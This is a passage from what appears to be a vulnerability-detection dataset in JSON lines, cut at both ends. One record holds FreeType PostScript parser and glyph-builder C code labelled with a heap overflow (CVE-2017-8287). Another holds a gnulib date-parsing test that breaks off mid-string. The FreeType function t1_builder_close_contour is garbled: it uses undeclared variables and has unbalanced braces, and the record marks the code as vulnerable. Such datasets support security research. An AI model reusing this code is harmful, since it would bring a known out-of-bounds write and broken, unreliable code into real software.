FT_Byte*  cur   = *acur;\n    FT_Int    count = 0;\n    FT_Byte   c, ender;\n\n\n    if ( cur >= limit )\n      goto Exit;\n\n    /* Check for the beginning of an array.  Otherwise, only one number */\n    /* will be read.                                                    */\n    c     = *cur;\n    ender = 0;\n\n    if ( c == '[' )\n      ender = ']';\n    else if ( c == '{' )\n      ender = '}';\n\n    if ( ender )\n      cur++;\n\n    /* now, read the values */\n    while ( cur < limit )\n    {\n      FT_Fixed  dummy;\n      FT_Byte*  old_cur;\n\n\n      /* skip whitespace in front of data */\n      skip_spaces( &cur, limit );\n      if ( cur >= limit )\n        goto Exit;\n\n      if ( *cur == ender )\n      {\n        cur++;\n        break;\n      }\n\n      old_cur = cur;\n\n      if ( values && count >= max_values )\n        break;\n\n      /* call PS_Conv_ToFixed() even if coords == NULL */\n      /* to properly parse number at `cur'             */\n      *( values ? &values[count] : &dummy ) =\n        PS_Conv_ToFixed( &cur, limit, power_ten );\n\n      if ( old_cur == cur )\n      {\n        count = -1;\n        goto Exit;\n      }\n      else\n        count++;\n\n      if ( !ender )\n        break;\n    }\n\n  Exit:\n    *acur = cur;\n    return count;\n  }\n\n\n#if 0\n\n  static FT_String*\n  ps_tostring( FT_Byte**  cursor,\n               FT_Byte*   limit,\n               FT_Memory  memory )\n  {\n    FT_Byte*    cur = *cursor;\n    FT_UInt     len = 0;\n    FT_Int      count;\n    FT_String*  result;\n    FT_Error    error;\n\n\n    /* XXX: some stupid fonts have a `Notice' or `Copyright' string     */\n    /*      that simply doesn't begin with an opening parenthesis, even */\n    /*      though they have a closing one!  E.g. \"amuncial.pfb\"        */\n    /*                                                                  */\n    /*      We must deal with these ill-fated cases there.  Note that   */\n    /*      these fonts didn't work with the old Type 1 driver as the   */\n    /*      notice/copyright was not recognized as a valid string token */\n    /*      and made the old token parser commit errors.                */\n\n    while ( cur < limit && ( *cur == ' ' || *cur == '\\t' ) )\n      cur++;\n    if ( cur + 1 >= limit )\n      return 0;\n\n    if ( *cur == '(' )\n      cur++;  /* skip the opening parenthesis, if there is one */\n\n    *cursor = cur;\n    count   = 0;\n\n    /* then, count its length */\n    for ( ; cur < limit; cur++ )\n    {\n      if ( *cur == '(' )\n        count++;\n\n      else if ( *cur == ')' )\n      {\n        count--;\n        if ( count < 0 )\n          break;\n      }\n    }\n\n    len = (FT_UInt)( cur - *cursor );\n    if ( cur >= limit || FT_ALLOC( result, len + 1 ) )\n      return 0;\n\n    /* now copy the string */\n    FT_MEM_COPY( result, *cursor, len );\n    result[len] = '\\0';\n    *cursor = cur;\n    return result;\n  }\n\n#endif /* 0 */\n\n\n  static int\n  ps_tobool( FT_Byte*  *acur,\n             FT_Byte*   limit )\n  {\n    FT_Byte*  cur    = *acur;\n    FT_Bool   result = 0;\n\n\n    /* return 1 if we find `true', 0 otherwise */\n    if ( cur + 3 < limit &&\n         cur[0] == 't'   &&\n         cur[1] == 'r'   &&\n         cur[2] == 'u'   &&\n         cur[3] == 'e'   )\n    {\n      result = 1;\n      cur   += 5;\n    }\n    else if ( cur + 4 < limit &&\n              cur[0] == 'f'   &&\n              cur[1] == 'a'   &&\n              cur[2] == 'l'   &&\n              cur[3] == 's'   &&\n              cur[4] == 'e'   )\n    {\n      result = 0;\n      cur   += 6;\n    }\n\n    *acur = cur;\n    return result;\n  }\n\n\n  /* load a simple field (i.e. non-table) into the current list of objects */\n\n  FT_LOCAL_DEF( FT_Error )\n  ps_parser_load_field( PS_Parser       parser,\n                        const T1_Field  field,\n                        void**          objects,\n                        FT_UInt         max_objects,\n                        FT_ULong*       pflags )\n  {\n    T1_TokenRec   token;\n    FT_Byte*      cur;\n    FT_Byte*      limit;\n    FT_UInt       count;\n    FT_UInt       idx;\n    FT_Error      error;\n    T1_FieldType  type;\n\n\n    /* this also skips leading whitespace */\n    ps_parser_to_token( parser, &token );\n    if ( !token.type )\n      goto Fail;\n\n    count = 1;\n    idx   = 0;\n    cur   = token.start;\n    limit = token.limit;\n\n    type = field->type;\n\n    /* we must detect arrays in /FontBBox */\n    if ( type == T1_FIELD_TYPE_BBOX )\n    {\n      T1_TokenRec  token2;\n      FT_Byte*     old_cur   = parser->cursor;\n      FT_Byte*     old_limit = parser->limit;\n\n\n      /* don't include delimiters */\n      parser->cursor = token.start + 1;\n      parser->limit  = token.limit - 1;\n\n      ps_parser_to_token( parser, &token2 );\n      parser->cursor = old_cur;\n      parser->limit  = old_limit;\n\n      if ( token2.type == T1_TOKEN_TYPE_ARRAY )\n      {\n        type = T1_FIELD_TYPE_MM_BBOX;\n        goto FieldArray;\n      }\n    }\n    else if ( token.type == T1_TOKEN_TYPE_ARRAY )\n    {\n      count = max_objects;\n\n    FieldArray:\n      /* if this is an array and we have no blend, an error occurs */\n      if ( max_objects == 0 )\n        goto Fail;\n\n      idx = 1;\n\n      /* don't include delimiters */\n      cur++;\n      limit--;\n    }\n\n    for ( ; count > 0; count--, idx++ )\n    {\n      FT_Byte*    q      = (FT_Byte*)objects[idx] + field->offset;\n      FT_Long     val;\n      FT_String*  string = NULL;\n\n\n      skip_spaces( &cur, limit );\n\n      switch ( type )\n      {\n      case T1_FIELD_TYPE_BOOL:\n        val = ps_tobool( &cur, limit );\n        goto Store_Integer;\n\n      case T1_FIELD_TYPE_FIXED:\n        val = PS_Conv_ToFixed( &cur, limit, 0 );\n        goto Store_Integer;\n\n      case T1_FIELD_TYPE_FIXED_1000:\n        val = PS_Conv_ToFixed( &cur, limit, 3 );\n        goto Store_Integer;\n\n      case T1_FIELD_TYPE_INTEGER:\n        val = PS_Conv_ToInt( &cur, limit );\n        /* fall through */\n\n      Store_Integer:\n        switch ( field->size )\n        {\n        case (8 / FT_CHAR_BIT):\n          *(FT_Byte*)q = (FT_Byte)val;\n          break;\n\n        case (16 / FT_CHAR_BIT):\n          *(FT_UShort*)q = (FT_UShort)val;\n          break;\n\n        case (32 / FT_CHAR_BIT):\n          *(FT_UInt32*)q = (FT_UInt32)val;\n          break;\n\n        default:                /* for 64-bit systems */\n          *(FT_Long*)q = val;\n        }\n        break;\n\n      case T1_FIELD_TYPE_STRING:\n      case T1_FIELD_TYPE_KEY:\n        {\n          FT_Memory  memory = parser->memory;\n          FT_UInt    len    = (FT_UInt)( limit - cur );\n\n\n          if ( cur >= limit )\n            break;\n\n          /* we allow both a string or a name   */\n          /* for cases like /FontName (foo) def */\n          if ( token.type == T1_TOKEN_TYPE_KEY )\n          {\n            /* don't include leading `/' */\n            len--;\n            cur++;\n          }\n          else if ( token.type == T1_TOKEN_TYPE_STRING )\n          {\n            /* don't include delimiting parentheses    */\n            /* XXX we don't handle <<...>> here        */\n            /* XXX should we convert octal escapes?    */\n            /*     if so, what encoding should we use? */\n            cur++;\n            len -= 2;\n          }\n          else\n          {\n            FT_ERROR(( \"ps_parser_load_field:\"\n                       \" expected a name or string\\n\"\n                       \"                     \"\n                       \" but found token of type %d instead\\n\",\n                       token.type ));\n            error = FT_THROW( Invalid_File_Format );\n            goto Exit;\n          }\n\n          /* for this to work (FT_String**)q must have been */\n          /* initialized to NULL                            */\n          if ( *(FT_String**)q )\n          {\n            FT_TRACE0(( \"ps_parser_load_field: overwriting field %s\\n\",\n                        field->ident ));\n            FT_FREE( *(FT_String**)q );\n            *(FT_String**)q = NULL;\n          }\n\n          if ( FT_ALLOC( string, len + 1 ) )\n            goto Exit;\n\n          FT_MEM_COPY( string, cur, len );\n          string[len] = 0;\n\n          *(FT_String**)q = string;\n        }\n        break;\n\n      case T1_FIELD_TYPE_BBOX:\n        {\n          FT_Fixed  temp[4];\n          FT_BBox*  bbox = (FT_BBox*)q;\n          FT_Int    result;\n\n\n          result = ps_tofixedarray( &cur, limit, 4, temp, 0 );\n\n          if ( result < 4 )\n          {\n            FT_ERROR(( \"ps_parser_load_field:\"\n                       \" expected four integers in bounding box\\n\" ));\n            error = FT_THROW( Invalid_File_Format );\n            goto Exit;\n          }\n\n          bbox->xMin = FT_RoundFix( temp[0] );\n          bbox->yMin = FT_RoundFix( temp[1] );\n          bbox->xMax = FT_RoundFix( temp[2] );\n          bbox->yMax = FT_RoundFix( temp[3] );\n        }\n        break;\n\n      case T1_FIELD_TYPE_MM_BBOX:\n        {\n          FT_Memory  memory = parser->memory;\n          FT_Fixed*  temp   = NULL;\n          FT_Int     result;\n          FT_UInt    i;\n\n\n          if ( FT_NEW_ARRAY( temp, max_objects * 4 ) )\n            goto Exit;\n\n          for ( i = 0; i < 4; i++ )\n          {\n            result = ps_tofixedarray( &cur, limit, (FT_Int)max_objects,\n                                      temp + i * max_objects, 0 );\n            if ( result < 0 || (FT_UInt)result < max_objects )\n            {\n              FT_ERROR(( \"ps_parser_load_field:\"\n                         \" expected %d integer%s in the %s subarray\\n\"\n                         \"                     \"\n                         \" of /FontBBox in the /Blend dictionary\\n\",\n                         max_objects, max_objects > 1 ? \"s\" : \"\",\n                         i == 0 ? \"first\"\n                                : ( i == 1 ? \"second\"\n                                           : ( i == 2 ? \"third\"\n                                                      : \"fourth\" ) ) ));\n              error = FT_THROW( Invalid_File_Format );\n\n              FT_FREE( temp );\n              goto Exit;\n            }\n\n            skip_spaces( &cur, limit );\n          }\n\n          for ( i = 0; i < max_objects; i++ )\n          {\n            FT_BBox*  bbox = (FT_BBox*)objects[i];\n\n\n            bbox->xMin = FT_RoundFix( temp[i                  ] );\n            bbox->yMin = FT_RoundFix( temp[i +     max_objects] );\n            bbox->xMax = FT_RoundFix( temp[i + 2 * max_objects] );\n            bbox->yMax = FT_RoundFix( temp[i + 3 * max_objects] );\n          }\n\n          FT_FREE( temp );\n        }\n        break;\n\n      default:\n        /* an error occurred */\n        goto Fail;\n      }\n    }\n\n#if 0  /* obsolete -- keep for reference */\n    if ( pflags )\n      *pflags |= 1L << field->flag_bit;\n#else\n    FT_UNUSED( pflags );\n#endif\n\n    error = FT_Err_Ok;\n\n  Exit:\n    return error;\n\n  Fail:\n    error = FT_THROW( Invalid_File_Format );\n    goto Exit;\n  }\n\n\n#define T1_MAX_TABLE_ELEMENTS  32\n\n\n  FT_LOCAL_DEF( FT_Error )\n  ps_parser_load_field_table( PS_Parser       parser,\n                              const T1_Field  field,\n                              void**          objects,\n                              FT_UInt         max_objects,\n                              FT_ULong*       pflags )\n  {\n    T1_TokenRec  elements[T1_MAX_TABLE_ELEMENTS];\n    T1_Token     token;\n    FT_Int       num_elements;\n    FT_Error     error = FT_Err_Ok;\n    FT_Byte*     old_cursor;\n    FT_Byte*     old_limit;\n    T1_FieldRec  fieldrec = *(T1_Field)field;\n\n\n    fieldrec.type = T1_FIELD_TYPE_INTEGER;\n    if ( field->type == T1_FIELD_TYPE_FIXED_ARRAY ||\n         field->type == T1_FIELD_TYPE_BBOX        )\n      fieldrec.type = T1_FIELD_TYPE_FIXED;\n\n    ps_parser_to_token_array( parser, elements,\n                              T1_MAX_TABLE_ELEMENTS, &num_elements );\n    if ( num_elements < 0 )\n    {\n      error = FT_ERR( Ignore );\n      goto Exit;\n    }\n    if ( (FT_UInt)num_elements > field->array_max )\n      num_elements = (FT_Int)field->array_max;\n\n    old_cursor = parser->cursor;\n    old_limit  = parser->limit;\n\n    /* we store the elements count if necessary;           */\n    /* we further assume that `count_offset' can't be zero */\n    if ( field->type != T1_FIELD_TYPE_BBOX && field->count_offset != 0 )\n      *(FT_Byte*)( (FT_Byte*)objects[0] + field->count_offset ) =\n        (FT_Byte)num_elements;\n\n    /* we now load each element, adjusting the field.offset on each one */\n    token = elements;\n    for ( ; num_elements > 0; num_elements--, token++ )\n    {\n      parser->cursor = token->start;\n      parser->limit  = token->limit;\n\n      error = ps_parser_load_field( parser,\n                                    &fieldrec,\n                                    objects,\n                                    max_objects,\n                                    0 );\n      if ( error )\n        break;\n\n      fieldrec.offset += fieldrec.size;\n    }\n\n#if 0  /* obsolete -- keep for reference */\n    if ( pflags )\n      *pflags |= 1L << field->flag_bit;\n#else\n    FT_UNUSED( pflags );\n#endif\n\n    parser->cursor = old_cursor;\n    parser->limit  = old_limit;\n\n  Exit:\n    return error;\n  }\n\n\n  FT_LOCAL_DEF( FT_Long )\n  ps_parser_to_int( PS_Parser  parser )\n  {\n    ps_parser_skip_spaces( parser );\n    return PS_Conv_ToInt( &parser->cursor, parser->limit );\n  }\n\n\n  /* first character must be `<' if `delimiters' is non-zero */\n\n  FT_LOCAL_DEF( FT_Error )\n  ps_parser_to_bytes( PS_Parser  parser,\n                      FT_Byte*   bytes,\n                      FT_Offset  max_bytes,\n                      FT_ULong*  pnum_bytes,\n                      FT_Bool    delimiters )\n  {\n    FT_Error  error = FT_Err_Ok;\n    FT_Byte*  cur;\n\n\n    ps_parser_skip_spaces( parser );\n    cur = parser->cursor;\n\n    if ( cur >= parser->limit )\n      goto Exit;\n\n    if ( delimiters )\n    {\n      if ( *cur != '<' )\n      {\n        FT_ERROR(( \"ps_parser_to_bytes: Missing starting delimiter `<'\\n\" ));\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      cur++;\n    }\n\n    *pnum_bytes = PS_Conv_ASCIIHexDecode( &cur,\n                                          parser->limit,\n                                          bytes,\n                                          max_bytes );\n\n    if ( delimiters )\n    {\n      if ( cur < parser->limit && *cur != '>' )\n      {\n        FT_ERROR(( \"ps_parser_to_bytes: Missing closing delimiter `>'\\n\" ));\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      cur++;\n    }\n\n    parser->cursor = cur;\n\n  Exit:\n    return error;\n  }\n\n\n  FT_LOCAL_DEF( FT_Fixed )\n  ps_parser_to_fixed( PS_Parser  parser,\n                      FT_Int     power_ten )\n  {\n    ps_parser_skip_spaces( parser );\n    return PS_Conv_ToFixed( &parser->cursor, parser->limit, power_ten );\n  }\n\n\n  FT_LOCAL_DEF( FT_Int )\n  ps_parser_to_coord_array( PS_Parser  parser,\n                            FT_Int     max_coords,\n                            FT_Short*  coords )\n  {\n    ps_parser_skip_spaces( parser );\n    return ps_tocoordarray( &parser->cursor, parser->limit,\n                            max_coords, coords );\n  }\n\n\n  FT_LOCAL_DEF( FT_Int )\n  ps_parser_to_fixed_array( PS_Parser  parser,\n                            FT_Int     max_values,\n                            FT_Fixed*  values,\n                            FT_Int     power_ten )\n  {\n    ps_parser_skip_spaces( parser );\n    return ps_tofixedarray( &parser->cursor, parser->limit,\n                            max_values, values, power_ten );\n  }\n\n\n#if 0\n\n  FT_LOCAL_DEF( FT_String* )\n  T1_ToString( PS_Parser  parser )\n  {\n    return ps_tostring( &parser->cursor, parser->limit, parser->memory );\n  }\n\n\n  FT_LOCAL_DEF( FT_Bool )\n  T1_ToBool( PS_Parser  parser )\n  {\n    return ps_tobool( &parser->cursor, parser->limit );\n  }\n\n#endif /* 0 */\n\n\n  FT_LOCAL_DEF( void )\n  ps_parser_init( PS_Parser  parser,\n                  FT_Byte*   base,\n                  FT_Byte*   limit,\n                  FT_Memory  memory )\n  {\n    parser->error  = FT_Err_Ok;\n    parser->base   = base;\n    parser->limit  = limit;\n    parser->cursor = base;\n    parser->memory = memory;\n    parser->funcs  = ps_parser_funcs;\n  }\n\n\n  FT_LOCAL_DEF( void )\n  ps_parser_done( PS_Parser  parser )\n  {\n    FT_UNUSED( parser );\n  }\n\n\n  /*************************************************************************/\n  /*************************************************************************/\n  /*****                                                               *****/\n  /*****                            T1 BUILDER                         *****/\n  /*****                                                               *****/\n  /*************************************************************************/\n  /*************************************************************************/\n\n  /*************************************************************************/\n  /*                                                                       */\n  /* <Function>                                                            */\n  /*    t1_builder_init                                                    */\n  /*                                                                       */\n  /* <Description>                                                         */\n  /*    Initializes a given glyph builder.                                 */\n  /*                                                                       */\n  /* <InOut>                                                               */\n  /*    builder :: A pointer to the glyph builder to initialize.           */\n  /*                                                                       */\n  /* <Input>                                                               */\n  /*    face    :: The current face object.                                */\n  /*                                                                       */\n  /*    size    :: The current size object.                                */\n  /*                                                                       */\n  /*    glyph   :: The current glyph object.                               */\n  /*                                                                       */\n  /*    hinting :: Whether hinting should be applied.                      */\n  /*                                                                       */\n  FT_LOCAL_DEF( void )\n  t1_builder_init( T1_Builder    builder,\n                   FT_Face       face,\n                   FT_Size       size,\n                   FT_GlyphSlot  glyph,\n                   FT_Bool       hinting )\n  {\n    builder->parse_state = T1_Parse_Start;\n    builder->load_points = 1;\n\n    builder->face   = face;\n    builder->glyph  = glyph;\n    builder->memory = face->memory;\n\n    if ( glyph )\n    {\n      FT_GlyphLoader  loader = glyph->internal->loader;\n\n\n      builder->loader  = loader;\n      builder->base    = &loader->base.outline;\n      builder->current = &loader->current.outline;\n      FT_GlyphLoader_Rewind( loader );\n\n      builder->hints_globals = size->internal;\n      builder->hints_funcs   = NULL;\n\n      if ( hinting )\n        builder->hints_funcs = glyph->internal->glyph_hints;\n    }\n\n    builder->pos_x = 0;\n    builder->pos_y = 0;\n\n    builder->left_bearing.x = 0;\n    builder->left_bearing.y = 0;\n    builder->advance.x      = 0;\n    builder->advance.y      = 0;\n\n    builder->funcs = t1_builder_funcs;\n  }\n\n\n  /*************************************************************************/\n  /*                                                                       */\n  /* <Function>                                                            */\n  /*    t1_builder_done                                                    */\n  /*                                                                       */\n  /* <Description>                                                         */\n  /*    Finalizes a given glyph builder.  Its contents can still be used   */\n  /*    after the call, but the function saves important information       */\n  /*    within the corresponding glyph slot.                               */\n  /*                                                                       */\n  /* <Input>                                                               */\n  /*    builder :: A pointer to the glyph builder to finalize.             */\n  /*                                                                       */\n  FT_LOCAL_DEF( void )\n  t1_builder_done( T1_Builder  builder )\n  {\n    FT_GlyphSlot  glyph = builder->glyph;\n\n\n    if ( glyph )\n      glyph->outline = *builder->base;\n  }\n\n\n  /* check that there is enough space for `count' more points */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_check_points( T1_Builder  builder,\n                           FT_Int      count )\n  {\n    return FT_GLYPHLOADER_CHECK_POINTS( builder->loader, count, 0 );\n  }\n\n\n  /* add a new point, do not check space */\n  FT_LOCAL_DEF( void )\n  t1_builder_add_point( T1_Builder  builder,\n                        FT_Pos      x,\n                        FT_Pos      y,\n                        FT_Byte     flag )\n  {\n    FT_Outline*  outline = builder->current;\n\n\n    if ( builder->load_points )\n    {\n      FT_Vector*  point   = outline->points + outline->n_points;\n      FT_Byte*    control = (FT_Byte*)outline->tags + outline->n_points;\n\n\n      point->x = FIXED_TO_INT( x );\n      point->y = FIXED_TO_INT( y );\n      *control = (FT_Byte)( flag ? FT_CURVE_TAG_ON : FT_CURVE_TAG_CUBIC );\n    }\n    outline->n_points++;\n  }\n\n\n  /* check space for a new on-curve point, then add it */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_add_point1( T1_Builder  builder,\n                         FT_Pos      x,\n                         FT_Pos      y )\n  {\n    FT_Error  error;\n\n\n    error = t1_builder_check_points( builder, 1 );\n    if ( !error )\n      t1_builder_add_point( builder, x, y, 1 );\n\n    return error;\n  }\n\n\n  /* check space for a new contour, then add it */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_add_contour( T1_Builder  builder )\n  {\n    FT_Outline*  outline = builder->current;\n    FT_Error     error;\n\n\n    /* this might happen in invalid fonts */\n    if ( !outline )\n    {\n      FT_ERROR(( \"t1_builder_add_contour: no outline to add points to\\n\" ));\n      return FT_THROW( Invalid_File_Format );\n    }\n\n    if ( !builder->load_points )\n    {\n      outline->n_contours++;\n      return FT_Err_Ok;\n    }\n\n    error = FT_GLYPHLOADER_CHECK_POINTS( builder->loader, 0, 1 );\n    if ( !error )\n    {\n      if ( outline->n_contours > 0 )\n        outline->contours[outline->n_contours - 1] =\n          (short)( outline->n_points - 1 );\n\n      outline->n_contours++;\n    }\n\n    return error;\n  }\n\n\n  /* if a path was begun, add its first on-curve point */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_start_point( T1_Builder  builder,\n                          FT_Pos      x,\n                          FT_Pos      y )\n  {\n    FT_Error  error = FT_ERR( Invalid_File_Format );\n\n\n    /* test whether we are building a new contour */\n\n    if ( builder->parse_state == T1_Parse_Have_Path )\n      error = FT_Err_Ok;\n    else\n    {\n      builder->parse_state = T1_Parse_Have_Path;\n      error = t1_builder_add_contour( builder );\n      if ( !error )\n        error = t1_builder_add_point1( builder, x, y );\n    }\n\n    return error;\n  }\n\n\n  /* close the current contour */\n  FT_LOCAL_DEF( void )\n  t1_builder_close_contour( T1_Builder  builder )\n  {\n    FT_Outline*  outline = builder->current;\n    FT_Int       first;\n\n\n    if ( !outline )\n      return;\n\n     first = outline->n_contours <= 1\n             ? 0 : outline->contours[outline->n_contours - 2] + 1;\n \n    /* in malformed fonts it can happen that a contour was started */\n    /* but no points were added                                    */\n    if ( outline->n_contours && first == outline->n_points )\n    {\n      outline->n_contours--;\n      return;\n    }\n\n     /* We must not include the last point in the path if it */\n     /* is located on the first point.                       */\n     if ( outline->n_points > 1 )\n      if ( p1->x == p2->x && p1->y == p2->y )\n        if ( *control == FT_CURVE_TAG_ON )\n          outline->n_points--;\n    }\n\n    if ( outline->n_contours > 0 )\n    {\n      /* Don't add contours only consisting of one point, i.e.,  */\n      /* check whether the first and the last point is the same. */\n      if ( first == outline->n_points - 1 )\n      {\n        outline->n_contours--;\n        outline->n_points--;\n      }\n      else\n        outline->contours[outline->n_contours - 1] =\n          (short)( outline->n_points - 1 );\n    }\n  }\n", "func_hash": 271086143539799141627769963035955134012, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-8287", "cve_desc": "FreeType 2 before 2017-03-26 has an out-of-bounds write caused by a heap-based buffer overflow related to the t1_builder_close_contour function in psaux/psobjs.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-8287"}
{"idx": 158076, "project": "savannah", "commit_id": "94e01571507835ff59dd8ce2a0b56a4b566965a4", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnulib.git;a=commit;h=94e01571507835ff59dd8ce2a0b56a4b566965a4", "commit_message": "None", "target": 0, "func": "main (int argc _GL_UNUSED, char **argv)\n{\n  struct timespec result;\n  struct timespec result2;\n  struct timespec expected;\n  struct timespec now;\n  const char *p;\n  int i;\n  long gmtoff;\n  time_t ref_time = 1304250918;\n\n  /* Set the time zone to US Eastern time with the 2012 rules.  This\n     should disable any leap second support.  Otherwise, there will be\n     a problem with glibc on sites that default to leap seconds; see\n     <http://bugs.gnu.org/12206>.  */\n  setenv (\"TZ\", \"EST5EDT,M3.2.0,M11.1.0\", 1);\n\n  gmtoff = gmt_offset (ref_time);\n\n\n  /* ISO 8601 extended date and time of day representation,\n     'T' separator, local time zone */\n  p = \"2011-05-01T11:55:18\";\n  expected.tv_sec = ref_time - gmtoff;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601 extended date and time of day representation,\n     ' ' separator, local time zone */\n  p = \"2011-05-01 11:55:18\";\n  expected.tv_sec = ref_time - gmtoff;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  /* ISO 8601, extended date and time of day representation,\n     'T' separator, UTC */\n  p = \"2011-05-01T11:55:18Z\";\n  expected.tv_sec = ref_time;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601, extended date and time of day representation,\n     ' ' separator, UTC */\n  p = \"2011-05-01 11:55:18Z\";\n  expected.tv_sec = ref_time;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  /* ISO 8601 extended date and time of day representation,\n     'T' separator, w/UTC offset */\n  p = \"2011-05-01T11:55:18-07:00\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601 extended date and time of day representation,\n     ' ' separator, w/UTC offset */\n  p = \"2011-05-01 11:55:18-07:00\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  /* ISO 8601 extended date and time of day representation,\n     'T' separator, w/hour only UTC offset */\n  p = \"2011-05-01T11:55:18-07\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n  /* ISO 8601 extended date and time of day representation,\n     ' ' separator, w/hour only UTC offset */\n  p = \"2011-05-01 11:55:18-07\";\n  expected.tv_sec = 1304276118;\n  expected.tv_nsec = 0;\n  ASSERT (parse_datetime (&result, p, 0));\n  LOG (p, expected, result);\n  ASSERT (expected.tv_sec == result.tv_sec\n          && expected.tv_nsec == result.tv_nsec);\n\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"now\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec == result.tv_sec && now.tv_nsec == result.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"tomorrow\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec + 24 * 60 * 60 == result.tv_sec\n          && now.tv_nsec == result.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"yesterday\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec - 24 * 60 * 60 == result.tv_sec\n          && now.tv_nsec == result.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"4 hours\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  ASSERT (now.tv_sec + 4 * 60 * 60 == result.tv_sec\n          && now.tv_nsec == result.tv_nsec);\n\n  /* test if timezone is not being ignored for day offset */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+400 +24 hours\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+400 +1 day\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  /* test if several time zones formats are handled same way */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+14:00\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+14\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  p = \"UTC+1400\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC-14:00\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC-14\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n  p = \"UTC-1400\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+0:15\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC+0015\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC-1:30\";\n  ASSERT (parse_datetime (&result, p, &now));\n  LOG (p, now, result);\n  p = \"UTC-130\";\n  ASSERT (parse_datetime (&result2, p, &now));\n  LOG (p, now, result2);\n  ASSERT (result.tv_sec == result2.tv_sec\n          && result.tv_nsec == result2.tv_nsec);\n\n\n  /* TZ out of range should cause parse_datetime failure */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+25:00\";\n  ASSERT (!parse_datetime (&result, p, &now));\n\n        /* Check for several invalid countable dayshifts */\n  now.tv_sec = 4711;\n  now.tv_nsec = 1267;\n  p = \"UTC+4:00 +40 yesterday\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 next yesterday\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 tomorrow ago\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 tomorrow hence\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 40 now ago\";\n  ASSERT (!parse_datetime (&result, p, &now));\n  p = \"UTC+4:00 